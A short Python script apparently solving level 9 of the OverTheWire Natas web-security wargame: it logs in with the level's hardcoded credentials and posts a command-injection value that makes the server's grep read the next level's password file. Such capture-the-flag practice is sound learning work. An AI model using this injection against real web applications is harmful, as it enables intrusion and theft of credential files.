#!usr/bin/env python

import re
import requests

username = 'natas9'
password = 'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

risultato = session.post(url, data = {"needle" : ". /etc/natas_webpass/natas10 #", "submit" : "submit" }, auth = (username, password))

#risultato = session.get(url, auth = (username, password))

contenuto = risultato.text

#print (contenuto)
print (re.findall('<pre>\n(.*)\n', contenuto) [0])